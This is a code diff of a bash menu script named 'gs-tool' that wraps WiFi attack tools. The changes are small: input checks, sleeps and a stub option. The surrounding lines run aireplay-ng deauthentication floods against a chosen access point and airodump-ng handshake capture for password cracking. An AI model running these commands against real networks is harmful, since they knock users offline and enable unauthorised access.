@@ -55,6 +55,13 @@ read -p 'gs-tool : ' choix
 
 
 
+if [ $choix = "" ]
+then
+echo error
+fi
+
+
+
 if [ $choix = "monitor" ]
 
 then
@@ -354,7 +361,6 @@ read -p 'security : ' apsec
  echo
  echo
  xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $apbssid $winterface | xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface | tput blink; echo -e  '\e[1;35m  close window if there is hanshake '; tput sgr0
- xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface
 
       if [ $? -eq 1 ]
       then
@@ -363,6 +369,8 @@ read -p 'security : ' apsec
           xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
           done
       fi
+ echo wait ...
+ sleep 3
  echo
  echo
  echo
@@ -668,11 +676,16 @@ xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $int
           xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
           done
       fi
-sleep 5
+sleep 5.8
 fi
 
 
 
+
+if [ $choix = "da patch" ]
+then
+echo "da patch"
+fi
 
 if [ $choix = "bacd" ]
 then
